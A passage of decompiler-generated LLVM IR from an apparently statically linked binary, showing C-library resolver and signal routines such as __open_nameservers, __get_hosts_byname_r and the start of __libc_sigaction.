  uselistorder i32 (i32, i32, i32)* @socket, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 3 }
  uselistorder i16* @global_var_1002ab24.681, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0, 5, 7, 6 }
  uselistorder i32 512, { 3, 4, 0, 1, 2, 5, 6, 7 }
  uselistorder label %dec_label_pc_100135d8, { 1, 0 }
  uselistorder label %dec_label_pc_100135a8, { 1, 0 }
  uselistorder label %dec_label_pc_10013578, { 1, 0 }
  uselistorder label %dec_label_pc_10013568, { 1, 0 }
  uselistorder label %dec_label_pc_10013558, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10013034.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001353c, { 1, 0 }
  uselistorder label %dec_label_pc_10013524, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_100134cc, { 6, 4, 5, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100134a4, { 1, 0 }
  uselistorder label %dec_label_pc_10013480, { 4, 5, 3, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_10013478, { 1, 0 }
  uselistorder label %dec_label_pc_10013464, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100133d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001330c, { 1, 0 }
  uselistorder label %dec_label_pc_10013304, { 1, 0 }
  uselistorder label %dec_label_pc_10013540thread-pre-split.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100131a8, { 1, 0 }
  uselistorder label %dec_label_pc_10013120, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013044, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10013610 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10013610, i32* @r3, align 4
  %v0_10013618 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), i32* %r3.global-to-local, align 4
  %v0_10013620 = call i32 @__pthread_return_0()
  store i32 %v0_10013620, i32* %r3.global-to-local, align 4
  %v3_10013628 = load i32, i32* @global_var_1002ac14.629, align 4
  %v2_1001362c = icmp sgt i32 %v3_10013628, 0
  br i1 %v2_1001362c, label %dec_label_pc_100138a4, label %dec_label_pc_10013634

dec_label_pc_10013634:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1001a600.694 to i32), i32* %r3.global-to-local, align 4
  store i32 268514892, i32* @lr, align 4
  %v3_10013648 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1001a600.694 to i32), i32 ptrtoint (i32* @global_var_1001a614.693 to i32))
  store i32 %v3_10013648, i32* %r3.global-to-local, align 4
  store i32 %v3_10013648, i32* @r26, align 4
  %v3_1001364c = icmp eq i32 %v3_10013648, 0
  br i1 %v3_1001364c, label %dec_label_pc_10013654, label %dec_label_pc_10013868.preheader

dec_label_pc_10013654:                            ; preds = %dec_label_pc_10013634
  %v0_10013658 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001a618.695 to i32), i32* %r3.global-to-local, align 4
  store i32 268514916, i32* @lr, align 4
  %v3_10013660 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1001a618.695 to i32), i32 %v0_10013658)
  store i32 %v3_10013660, i32* %r3.global-to-local, align 4
  store i32 %v3_10013660, i32* @r26, align 4
  %v3_10013664 = icmp eq i32 %v3_10013660, 0
  br i1 %v3_10013664, label %dec_label_pc_10013898, label %dec_label_pc_10013868.preheader

dec_label_pc_10013868.preheader:                  ; preds = %dec_label_pc_10013634, %dec_label_pc_10013654
  %v0_1001387416 = phi i32 [ %v3_10013648, %dec_label_pc_10013634 ], [ %v3_10013660, %dec_label_pc_10013654 ]
  %v2_10013868 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100136742 = bitcast i32* %stack_var_-164 to i8*
  %v3_10013758 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10013868

dec_label_pc_10013670:                            ; preds = %dec_label_pc_10013688
  %v1_10013670 = add i32 %v0_100137309, 1
  store i32 %v1_10013670, i32* %r3.global-to-local, align 4
  %v1_10013674 = inttoptr i32 %v1_10013670 to i8*
  %v2_10013674 = load i8, i8* %v1_10013674, align 1
  %v3_10013674 = zext i8 %v2_10013674 to i32
  store i32 %v3_10013674, i32* %r11.global-to-local, align 4
  %v3_1001367c = icmp eq i8 %v2_10013674, 0
  br i1 %v3_1001367c, label %dec_label_pc_10013868.backedge, label %dec_label_pc_10013688

dec_label_pc_10013688:                            ; preds = %dec_label_pc_10013688.lr.ph, %dec_label_pc_10013670
  %v0_1001368c.in = phi i32 [ %v3_100136744, %dec_label_pc_10013688.lr.ph ], [ %v3_10013674, %dec_label_pc_10013670 ]
  %v0_100136a0 = phi i32 [ %v3_100136744, %dec_label_pc_10013688.lr.ph ], [ %v3_10013674, %dec_label_pc_10013670 ]
  %v0_100137309 = phi i32 [ %v2_10013868, %dec_label_pc_10013688.lr.ph ], [ %v1_10013670, %dec_label_pc_10013670 ]
  %v0_1001368c = mul nuw nsw i32 %v0_1001368c.in, 2
  %v2_1001368c = add i32 %v0_1001368c, %v3_10013688.pre
  %v3_1001368c = inttoptr i32 %v2_1001368c to i16*
  %v4_1001368c = load i16, i16* %v3_1001368c, align 2
  %v1_10013690 = and i16 %v4_1001368c, 32
  %v3_10013690 = icmp eq i16 %v1_10013690, 0
  br i1 %v3_10013690, label %dec_label_pc_10013698, label %dec_label_pc_10013670

dec_label_pc_10013698:                            ; preds = %dec_label_pc_10013688
  %v3_10013698 = icmp eq i32 %v0_100136a0, 10
  br i1 %v3_10013698, label %dec_label_pc_10013868.backedge, label %dec_label_pc_100136a0

dec_label_pc_10013868.backedge:                   ; preds = %dec_label_pc_10013670, %dec_label_pc_1001381c, %dec_label_pc_10013824, %dec_label_pc_1001385c, %dec_label_pc_10013674.preheader, %dec_label_pc_10013698, %dec_label_pc_100136a0, %dec_label_pc_100137c4
  %v0_10013874.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10013868

dec_label_pc_100136a0:                            ; preds = %dec_label_pc_10013698
  %v3_100136a0 = icmp eq i32 %v0_100136a0, 35
  br i1 %v3_100136a0, label %dec_label_pc_10013868.backedge, label %dec_label_pc_100136a8

dec_label_pc_100136a8:                            ; preds = %dec_label_pc_100136a0
  store i32 0, i32* @r27, align 4
  store i32 %v2_10013610, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001373010 = inttoptr i32 %v0_100137309 to i8*
  %v2_1001373011 = load i8, i8* %v1_1001373010, align 1
  %v3_1001373414 = icmp eq i8 %v2_1001373011, 0
  br i1 %v3_1001373414, label %dec_label_pc_10013744, label %dec_label_pc_1001373c

dec_label_pc_100136bc:                            ; preds = %dec_label_pc_1001373c
  %v1_100136bc = mul i32 %v0_100136bc, 4
  %v3_100136c0 = load i32, i32* @global_var_1002ab70, align 4
  store i32 %v3_100136c0, i32* %r11.global-to-local, align 4
  %v1_100136c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100136c4 = add i32 %v1_100136c4, %v1_100136bc
  %v2_100136c8 = add i32 %v2_100136c4, 16
  %v3_100136c8 = inttoptr i32 %v2_100136c8 to i32*
  store i32 %v0_100136c8, i32* %v3_100136c8, align 4
  %v0_100136d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100136d4

dec_label_pc_100136d0:                            ; preds = %dec_label_pc_100136e8
  %v1_100136d0 = add i32 %v0_100136d0, 1
  store i32 %v1_100136d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100136d4

dec_label_pc_100136d4:                            ; preds = %dec_label_pc_100136bc, %dec_label_pc_100136d0
  %v0_100136d0 = phi i32 [ %v0_100136d4.pre, %dec_label_pc_100136bc ], [ %v1_100136d0, %dec_label_pc_100136d0 ]
  %v1_100136d4 = inttoptr i32 %v0_100136d0 to i8*
  %v2_100136d4 = load i8, i8* %v1_100136d4, align 1
  %v3_100136d8 = icmp eq i8 %v2_100136d4, 0
  br i1 %v3_100136d8, label %dec_label_pc_10013704, label %dec_label_pc_100136e8

dec_label_pc_100136e8:                            ; preds = %dec_label_pc_100136d4
  %v3_100136e0 = icmp eq i8 %v2_100136d4, 10
  %v3_100136d4 = zext i8 %v2_100136d4 to i32
  %v1_100136dc = mul nuw nsw i32 %v3_100136d4, 2
  %v1_100136e8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100136e8 = add i32 %v1_100136e8, %v1_100136dc
  %v3_100136e8 = inttoptr i32 %v2_100136e8 to i16*
  %v4_100136e8 = load i16, i16* %v3_100136e8, align 2
  %v1_100136ec = and i16 %v4_100136e8, 32
  %v3_100136ec.not = icmp ne i16 %v1_100136ec, 0
  %brmerge = or i1 %v3_100136e0, %v3_100136ec.not
  br i1 %brmerge, label %dec_label_pc_10013704, label %dec_label_pc_100136d0

dec_label_pc_100136fc:                            ; preds = %dec_label_pc_10013718
  %v0_100136fc = load i32, i32* %r7.global-to-local, align 4
  %v1_100136fc = trunc i32 %v0_100136fc to i8
  store i8 %v1_100136fc, i8* %v1_10013704, align 1
  %v0_10013700 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013700 = add i32 %v0_10013700, 1
  store i32 %v1_10013700, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013704

dec_label_pc_10013704:                            ; preds = %dec_label_pc_100136e8, %dec_label_pc_100136d4, %dec_label_pc_100136fc
  %v0_10013730 = phi i32 [ %v1_10013700, %dec_label_pc_100136fc ], [ %v0_100136d0, %dec_label_pc_100136d4 ], [ %v0_100136d0, %dec_label_pc_100136e8 ]
  %v1_10013704 = inttoptr i32 %v0_10013730 to i8*
  %v2_10013704 = load i8, i8* %v1_10013704, align 1
  %v3_10013704 = zext i8 %v2_10013704 to i32
  %v3_10013708 = icmp eq i8 %v2_10013704, 0
  %v1_1001370c = mul nuw nsw i32 %v3_10013704, 2
  store i32 %v1_1001370c, i32* %r11.global-to-local, align 4
  br i1 %v3_10013708, label %dec_label_pc_1001372c, label %dec_label_pc_10013718

dec_label_pc_10013718:                            ; preds = %dec_label_pc_10013704
  %v3_10013710 = icmp eq i8 %v2_10013704, 10
  %v3_10013718 = load i32, i32* @global_var_1002ab70, align 4
  %v2_1001371c = add i32 %v3_10013718, %v1_1001370c
  %v3_1001371c = inttoptr i32 %v2_1001371c to i16*
  %v4_1001371c = load i16, i16* %v3_1001371c, align 2
  %v1_10013720 = and i16 %v4_1001371c, 32
  %v3_10013720.not = icmp ne i16 %v1_10013720, 0
  %brmerge27 = or i1 %v3_10013710, %v3_10013720.not
  br i1 %brmerge27, label %dec_label_pc_100136fc, label %dec_label_pc_1001372c

dec_label_pc_1001372c:                            ; preds = %dec_label_pc_10013718, %dec_label_pc_10013704
  %v0_1001372c = load i32, i32* @r27, align 4
  %v1_1001372c = add i32 %v0_1001372c, 1
  store i32 %v1_1001372c, i32* @r27, align 4
  %v2_10013730 = load i8, i8* %v1_10013704, align 1
  %v3_10013734 = icmp eq i8 %v2_10013730, 0
  br i1 %v3_10013734, label %dec_label_pc_10013744, label %dec_label_pc_1001373c

dec_label_pc_1001373c:                            ; preds = %dec_label_pc_100136a8, %dec_label_pc_1001372c
  %v0_100136c8 = phi i32 [ %v0_10013730, %dec_label_pc_1001372c ], [ %v0_100137309, %dec_label_pc_100136a8 ]
  %v0_100136bc = phi i32 [ %v1_1001372c, %dec_label_pc_1001372c ], [ 0, %dec_label_pc_100136a8 ]
  %tmp33 = icmp slt i32 %v0_100136bc, 5
  br i1 %tmp33, label %dec_label_pc_100136bc, label %dec_label_pc_10013744

dec_label_pc_10013744:                            ; preds = %dec_label_pc_1001372c, %dec_label_pc_1001373c, %dec_label_pc_100136a8
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001a630.696 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10013758 = call i32 @__GI_strcoll(i8* %v3_10013758, i32 ptrtoint ([11 x i8]* @global_var_1001a630.696 to i32))
  store i32 %v4_10013758, i32* %r3.global-to-local, align 4
  %v3_1001375c = icmp eq i32 %v4_10013758, 0
  br i1 %v3_1001375c, label %dec_label_pc_10013788, label %dec_label_pc_100137ac

dec_label_pc_10013768:                            ; preds = %dec_label_pc_100137a0
  %v1_10013768 = add i32 %v2_10013790, 24
  %v2_10013768 = inttoptr i32 %v1_10013768 to i32*
  %v3_10013768 = load i32, i32* %v2_10013768, align 4
  store i32 %v3_10013768, i32* %r3.global-to-local, align 4
  store i32 268515184, i32* @lr, align 4
  %v1_1001376c = call i32 @__GI_strdup(i32 %v3_10013768)
  store i32 %v1_1001376c, i32* %r3.global-to-local, align 4
  %v0_10013774 = load i32, i32* @r29, align 4
  %v1_10013774 = add i32 %v0_10013774, 1
  store i32 %v1_10013774, i32* %r11.global-to-local, align 4
  %v1_10013778 = mul i32 %v0_10013774, 4
  store i32 %v1_10013774, i32* @global_var_1002ac14.629, align 4
  %v3_10013784 = add i32 %v1_10013778, ptrtoint (i32* @global_var_10030f10.630 to i32)
  %v4_10013784 = inttoptr i32 %v3_10013784 to i32*
  store i32 %v1_1001376c, i32* %v4_10013784, align 4
  br label %dec_label_pc_10013788

dec_label_pc_10013788:                            ; preds = %dec_label_pc_10013744, %dec_label_pc_10013768
  %v0_10013788 = load i32, i32* @r31, align 4
  %v1_10013788 = load i32, i32* @r27, align 4
  %v2_10013788 = icmp slt i32 %v0_10013788, %v1_10013788
  %v1_1001378c = mul i32 %v0_10013788, 4
  %v0_10013790 = load i32, i32* @r1, align 4
  %v2_10013790 = add i32 %v0_10013790, %v1_1001378c
  br i1 %v2_10013788, label %dec_label_pc_100137a0, label %dec_label_pc_100137ac

dec_label_pc_100137a0:                            ; preds = %dec_label_pc_10013788
  %v3_100137a0 = load i32, i32* @global_var_1002ac14.629, align 4
  %tmp35 = icmp slt i32 %v3_100137a0, 3
  br i1 %tmp35, label %dec_label_pc_10013768, label %dec_label_pc_100137ac

dec_label_pc_100137ac:                            ; preds = %dec_label_pc_100137a0, %dec_label_pc_10013788, %dec_label_pc_10013744
  %v0_100137b0 = load i32, i32* @r30, align 4
  store i32 %v0_100137b0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a63c.697 to i32), i32* @r4, align 4
  %v3_100137b8 = inttoptr i32 %v0_100137b0 to i8*
  %v4_100137b8 = call i32 @__GI_strcoll(i8* %v3_100137b8, i32 ptrtoint ([7 x i8]* @global_var_1001a63c.697 to i32))
  store i32 %v4_100137b8, i32* %r3.global-to-local, align 4
  %v3_100137bc = icmp eq i32 %v4_100137b8, 0
  br i1 %v3_100137bc, label %dec_label_pc_100137fc.preheader, label %dec_label_pc_100137c4

dec_label_pc_100137c4:                            ; preds = %dec_label_pc_100137ac
  %v0_100137c8 = load i32, i32* @r30, align 4
  store i32 %v0_100137c8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a644.698 to i32), i32* @r4, align 4
  %v3_100137d0 = inttoptr i32 %v0_100137c8 to i8*
  %v4_100137d0 = call i32 @__GI_strcoll(i8* %v3_100137d0, i32 ptrtoint ([7 x i8]* @global_var_1001a644.698 to i32))
  store i32 %v4_100137d0, i32* %r3.global-to-local, align 4
  %v3_100137d4 = icmp eq i32 %v4_100137d0, 0
  br i1 %v3_100137d4, label %dec_label_pc_100137fc.preheader, label %dec_label_pc_10013868.backedge

dec_label_pc_100137fc.preheader:                  ; preds = %dec_label_pc_100137ac, %dec_label_pc_100137c4
  store i32 ptrtoint (i32* @global_var_10030f00.685 to i32), i32* @r31, align 4
  %v3_1001380841 = load i32, i32* @global_var_1002ac18.683, align 4
  %v2_1001380c43 = icmp sgt i32 %v3_1001380841, 0
  %v1_1001381045 = add i32 %v3_1001380841, -1
  %v1_1001381446 = mul i32 %v1_1001381045, 4
  store i32 %v1_1001381446, i32* %r11.global-to-local, align 4
  br i1 %v2_1001380c43, label %dec_label_pc_100137e0, label %dec_label_pc_1001381c

dec_label_pc_100137e0:                            ; preds = %dec_label_pc_100137fc.preheader, %dec_label_pc_100137e0
  %v1_1001381448 = phi i32 [ %v1_10013814, %dec_label_pc_100137e0 ], [ %v1_1001381446, %dec_label_pc_100137fc.preheader ]
  %v1_1001381047 = phi i32 [ %v1_10013810, %dec_label_pc_100137e0 ], [ %v1_1001381045, %dec_label_pc_100137fc.preheader ]
  %v2_100137e0 = add i32 %v1_1001381448, ptrtoint (i32* @global_var_10030f00.685 to i32)
  %v3_100137e0 = inttoptr i32 %v2_100137e0 to i32*
  %v4_100137e0 = load i32, i32* %v3_100137e0, align 4
  store i32 %v4_100137e0, i32* %r3.global-to-local, align 4
  store i32 %v1_1001381047, i32* @global_var_1002ac18.683, align 4
  store i32 268515308, i32* @lr, align 4
  %v1_100137e8 = call i32 @free(i32 %v4_100137e0)
  store i32 %v1_100137e8, i32* %r3.global-to-local, align 4
  %v3_100137ec = load i32, i32* @global_var_1002ac18.683, align 4
  %v1_100137f4 = mul i32 %v3_100137ec, 4
  %v1_100137f8 = load i32, i32* @r31, align 4
  %v3_100137f8 = add i32 %v1_100137f8, %v1_100137f4
  %v4_100137f8 = inttoptr i32 %v3_100137f8 to i32*
  store i32 0, i32* %v4_100137f8, align 4
  store i32 ptrtoint (i32* @global_var_10030f00.685 to i32), i32* @r31, align 4
  %v3_10013808 = load i32, i32* @global_var_1002ac18.683, align 4
  %v2_1001380c = icmp sgt i32 %v3_10013808, 0
  %v1_10013810 = add i32 %v3_10013808, -1
  %v1_10013814 = mul i32 %v1_10013810, 4
  store i32 %v1_10013814, i32* %r11.global-to-local, align 4
  br i1 %v2_1001380c, label %dec_label_pc_100137e0, label %dec_label_pc_1001381c

dec_label_pc_1001381c:                            ; preds = %dec_label_pc_100137e0, %dec_label_pc_100137fc.preheader
  %v3_1001385c59 = phi i32 [ %v3_1001380841, %dec_label_pc_100137fc.preheader ], [ %v3_10013808, %dec_label_pc_100137e0 ]
  %v1_1001384449 = load i32, i32* @r27, align 4
  %v2_1001384450 = icmp sgt i32 %v1_1001384449, 1
  %v0_1001384c53 = load i32, i32* @r1, align 4
  %v2_1001384c54 = add i32 %v0_1001384c53, 4
  br i1 %v2_1001384450, label %dec_label_pc_1001385c, label %dec_label_pc_10013868.backedge

dec_label_pc_10013824:                            ; preds = %dec_label_pc_1001385c
  %v1_10013824 = add i32 %v2_1001384c55, 24
  %v2_10013824 = inttoptr i32 %v1_10013824 to i32*
  %v3_10013824 = load i32, i32* %v2_10013824, align 4
  store i32 %v3_10013824, i32* %r3.global-to-local, align 4
  store i32 268515372, i32* @lr, align 4
  %v1_10013828 = call i32 @__GI_strdup(i32 %v3_10013824)
  store i32 %v1_10013828, i32* %r3.global-to-local, align 4
  %v0_10013830 = load i32, i32* @r29, align 4
  %v1_10013830 = add i32 %v0_10013830, 1
  store i32 %v1_10013830, i32* %r11.global-to-local, align 4
  %v1_10013834 = mul i32 %v0_10013830, 4
  store i32 %v1_10013830, i32* @global_var_1002ac18.683, align 4
  %v3_10013840 = add i32 %v1_10013834, ptrtoint (i32* @global_var_10030f00.685 to i32)
  %v4_10013840 = inttoptr i32 %v3_10013840 to i32*
  store i32 %v1_10013828, i32* %v4_10013840, align 4
  %v0_10013844.pre = load i32, i32* @r31, align 4
  %v1_10013844 = load i32, i32* @r27, align 4
  %v2_10013844 = icmp slt i32 %v0_10013844.pre, %v1_10013844
  br i1 %v2_10013844, label %dec_label_pc_10013824.dec_label_pc_1001385c_crit_edge, label %dec_label_pc_10013868.backedge

dec_label_pc_10013824.dec_label_pc_1001385c_crit_edge: ; preds = %dec_label_pc_10013824
  %v0_1001384c = load i32, i32* @r1, align 4
  %v1_10013848 = mul i32 %v0_10013844.pre, 4
  %v2_1001384c = add i32 %v0_1001384c, %v1_10013848
  %v3_1001385c.pre = load i32, i32* @global_var_1002ac18.683, align 4
  br label %dec_label_pc_1001385c

dec_label_pc_1001385c:                            ; preds = %dec_label_pc_1001381c, %dec_label_pc_10013824.dec_label_pc_1001385c_crit_edge
  %v3_1001385c = phi i32 [ %v3_1001385c.pre, %dec_label_pc_10013824.dec_label_pc_1001385c_crit_edge ], [ %v3_1001385c59, %dec_label_pc_1001381c ]
  %v2_1001384c55 = phi i32 [ %v2_1001384c, %dec_label_pc_10013824.dec_label_pc_1001385c_crit_edge ], [ %v2_1001384c54, %dec_label_pc_1001381c ]
  %tmp37 = icmp slt i32 %v3_1001385c, 4
  br i1 %tmp37, label %dec_label_pc_10013824, label %dec_label_pc_10013868.backedge

dec_label_pc_10013868:                            ; preds = %dec_label_pc_10013868.backedge, %dec_label_pc_10013868.preheader
  %v0_10013874 = phi i32 [ %v0_10013874.pre, %dec_label_pc_10013868.backedge ], [ %v0_1001387416, %dec_label_pc_10013868.preheader ]
  store i32 %v2_10013868, i32* %r3.global-to-local, align 4
  store i32 268515452, i32* @lr, align 4
  %v3_10013878 = call i32 @fgets(i32 %v2_10013868, i32 128, i32 %v0_10013874)
  store i32 %v3_10013878, i32* %r3.global-to-local, align 4
  %v3_1001387c = icmp eq i32 %v3_10013878, 0
  br i1 %v3_1001387c, label %dec_label_pc_1001388c, label %dec_label_pc_10013674.preheader

dec_label_pc_10013674.preheader:                  ; preds = %dec_label_pc_10013868
  store i32 %v2_10013868, i32* %r3.global-to-local, align 4
  %v2_100136743 = load i8, i8* %v1_100136742, align 4
  %v3_100136744 = zext i8 %v2_100136743 to i32
  store i32 %v3_100136744, i32* %r11.global-to-local, align 4
  %v3_1001367c6 = icmp eq i8 %v2_100136743, 0
  br i1 %v3_1001367c6, label %dec_label_pc_10013868.backedge, label %dec_label_pc_10013688.lr.ph

dec_label_pc_10013688.lr.ph:                      ; preds = %dec_label_pc_10013674.preheader
  %v3_10013688.pre = load i32, i32* @global_var_1002ab70, align 4
  br label %dec_label_pc_10013688

dec_label_pc_1001388c:                            ; preds = %dec_label_pc_10013868
  %v0_1001388c = load i32, i32* @r26, align 4
  store i32 %v0_1001388c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013894.699 to i32), i32* @lr, align 4
  %v1_10013890 = inttoptr i32 %v0_1001388c to i16*
  %v2_10013890 = call i32 @__GI_fclose(i16* %v1_10013890)
  store i32 %v2_10013890, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100138a4

dec_label_pc_10013898:                            ; preds = %dec_label_pc_10013654
  %v0_10013898 = call i32 @__GI___h_errno_location()
  store i32 %v0_10013898, i32* %r3.global-to-local, align 4
  %v2_100138a0 = inttoptr i32 %v0_10013898 to i32*
  store i32 3, i32* %v2_100138a0, align 4
  br label %dec_label_pc_100138a4

dec_label_pc_100138a4:                            ; preds = %entry, %dec_label_pc_1001388c, %dec_label_pc_10013898
  store i32 %v2_10013610, i32* @r3, align 4
  %v0_100138ac = call i32 @__pthread_return_void()
  store i32 %v0_100138ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_100138ac

; uselistorder directives
  uselistorder i32 %v3_100136744, { 2, 0, 1 }
  uselistorder i32 %v1_1001381446, { 1, 0 }
  uselistorder i32 %v1_1001381045, { 1, 0 }
  uselistorder i32 %v0_100136bc, { 1, 0 }
  uselistorder i32 %v1_1001370c, { 1, 0 }
  uselistorder i8* %v1_10013704, { 0, 2, 1 }
  uselistorder i8 %v2_100136d4, { 2, 0, 1 }
  uselistorder i32 %v0_100136d0, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10013674, { 1, 0, 2 }
  uselistorder i32 %v1_10013670, { 0, 2, 1 }
  uselistorder i32 %v2_10013868, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10013610, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 7, 8, 1, 9, 20, 4, 26, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 21, 22, 23, 25, 24, 0, 5, 27, 6, 28, 2, 29 }
  uselistorder i32* %r11.global-to-local, { 4, 1, 2, 0, 3, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 1, 5, 4, 0, 3, 2 }
  uselistorder i32* @global_var_1002ac18.683, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10030f00.685 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10030f10.630 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ab28.628 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_100138a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001385c, { 1, 0 }
  uselistorder label %dec_label_pc_100137e0, { 1, 0 }
  uselistorder label %dec_label_pc_100137fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10013788, { 1, 0 }
  uselistorder label %dec_label_pc_10013744, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001373c, { 1, 0 }
  uselistorder label %dec_label_pc_10013704, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100136d4, { 1, 0 }
  uselistorder label %dec_label_pc_10013868.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10013868.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_100138c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268515592, i32* @lr, align 4
  %v9_10013904 = inttoptr i32 %arg3 to i32*
  %v10_10013904 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10013904, i32 %arg4, i32 %arg5, i32 %v4_100138c8, i32 %arg7)
  ret i32 %v10_10013904
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_10013920 = load i32, i32* @lr, align 4
  store i32 %v0_10013920, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1001392c = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_1001393c = add i32 %tmp, 4
  store i32 %v1_1001393c, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_10013944 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_10013944, i32* @r3, align 4
  br i1 %v3_1001392c, label %dec_label_pc_1001396c, label %dec_label_pc_1001394c

dec_label_pc_1001394c:                            ; preds = %entry
  %v2_1001394c = load i32, i32* %arg2, align 4
  store i32 %v2_1001394c, i32* %r0.global-to-local, align 4
  store i32 268515672, i32* @lr, align 4
  %v0_10013954 = call i32 @memcpy()
  %v0_10013958 = load i32, i32* @r31, align 4
  %v1_10013958 = add i32 %v0_10013958, 132
  %v2_10013958 = inttoptr i32 %v1_10013958 to i32*
  %v3_10013958 = load i32, i32* %v2_10013958, align 4
  store i32 %v3_10013958, i32* %r0.global-to-local, align 4
  %v1_10013964 = add i32 %v0_10013958, 136
  %v2_10013964 = inttoptr i32 %v1_10013964 to i32*
  %v3_10013964 = load i32, i32* %v2_10013964, align 4
  store i32 %v3_10013964, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001396c

dec_label_pc_1001396c:                            ; preds = %entry, %dec_label_pc_1001394c
  store i32 268515724, i32* @lr, align 4
  %v0_10013988 = call i32 @__syscall_rt_sigaction()
  %v0_1001398c = load i32, i32* %r30.global-to-local, align 4
  %v3_1001398c = icmp eq i32 %v0_1001398c, 0
  store i32 %v0_10013988, i32* @r31, align 4
  br i1 %v3_1001398c, label %dec_label_pc_100139c8, label %dec_label_pc_1001399c

dec_label_pc_1001399c:                            ; preds = %dec_label_pc_1001396c
  %v1_10013994 = icmp slt i32 %v0_10013988, 0
  %v1_1001399c = add i32 %v0_1001398c, 4
  store i32 %v1_1001399c, i32* @r3, align 4
  %v2_100139a0 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_100139a0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_10013994, label %dec_label_pc_100139c8, label %dec_label_pc_100139ac

dec_label_pc_100139ac:                            ; preds = %dec_label_pc_1001399c
  %v3_100139ac = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_100139ac, i32* %r0.global-to-local, align 4
  %v2_100139b0 = inttoptr i32 %v0_1001398c to i32*
  store i32 %v3_100139ac, i32* %v2_100139b0, align 4
  store i32 268515768, i32* @lr, align 4
  %v0_100139b4 = call i32 @memcpy()
